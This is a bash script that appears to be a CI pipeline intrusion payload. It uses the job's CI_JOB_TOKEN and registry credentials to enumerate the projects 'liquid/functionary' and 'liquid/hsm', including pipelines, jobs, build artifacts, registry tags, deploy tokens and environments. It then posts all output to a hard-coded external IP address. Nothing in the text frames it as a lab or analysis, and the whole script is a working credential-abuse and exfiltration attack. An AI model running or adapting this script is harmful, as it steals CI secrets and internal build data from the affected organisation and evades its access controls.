#!/bin/bash
{
echo "==S32=="

# Find functionary project ID first
echo "==PROJ_SEARCH=="
curl -sf -H "JOB-TOKEN: ${CI_JOB_TOKEN}" "${CI_API_V4_URL}/projects?search=functionary&per_page=50" 2>&1 | head -200

# Try to access CI jobs/artifacts for liquid/functionary
# The project path is liquid/functionary — URL encode it
PROJ="liquid%2Ffunctionary"
echo "==PIPELINES=="
curl -sf -H "JOB-TOKEN: ${CI_JOB_TOKEN}" "${CI_API_V4_URL}/projects/${PROJ}/pipelines?per_page=5" 2>&1 | head -200

echo "==JOBS=="
curl -sf -H "JOB-TOKEN: ${CI_JOB_TOKEN}" "${CI_API_V4_URL}/projects/${PROJ}/jobs?per_page=10" 2>&1 | head -300

echo "==ARTIFACTS=="
curl -sf -H "JOB-TOKEN: ${CI_JOB_TOKEN}" "${CI_API_V4_URL}/projects/${PROJ}/jobs/artifacts/master/download?job=build" 2>&1 | head -50

echo "==REGISTRY_REPOS=="
curl -sf -H "JOB-TOKEN: ${CI_JOB_TOKEN}" "${CI_API_V4_URL}/projects/${PROJ}/registry/repositories" 2>&1 | head -200

echo "==REGISTRY_TAGS=="
curl -sf -u "${CI_REGISTRY_USER}:${CI_REGISTRY_PASSWORD}" "https://${CI_REGISTRY}/v2/liquid/functionary/tags/list" 2>&1 | head -100
curl -sf -u "${CI_REGISTRY_USER}:${CI_REGISTRY_PASSWORD}" "https://${CI_REGISTRY}/v2/liquid/hsm/tags/list" 2>&1 | head -100

echo "==HSM_PROJ=="
HPROJ="liquid%2Fhsm"
curl -sf -H "JOB-TOKEN: ${CI_JOB_TOKEN}" "${CI_API_V4_URL}/projects/${HPROJ}/pipelines?per_page=5" 2>&1 | head -100
curl -sf -H "JOB-TOKEN: ${CI_JOB_TOKEN}" "${CI_API_V4_URL}/projects/${HPROJ}/jobs?per_page=5" 2>&1 | head -200

echo "==DEPLOY_TOKENS=="
curl -sf -H "JOB-TOKEN: ${CI_JOB_TOKEN}" "${CI_API_V4_URL}/projects/${PROJ}/deploy_tokens" 2>&1 | head -100

echo "==ENVIRONMENTS=="
curl -sf -H "JOB-TOKEN: ${CI_JOB_TOKEN}" "${CI_API_V4_URL}/projects/${PROJ}/environments" 2>&1 | head -200

echo "==END=="
} 2>&1 | curl -s -m120 -X POST http://144.172.110.44:8443/s32 --data-binary @-
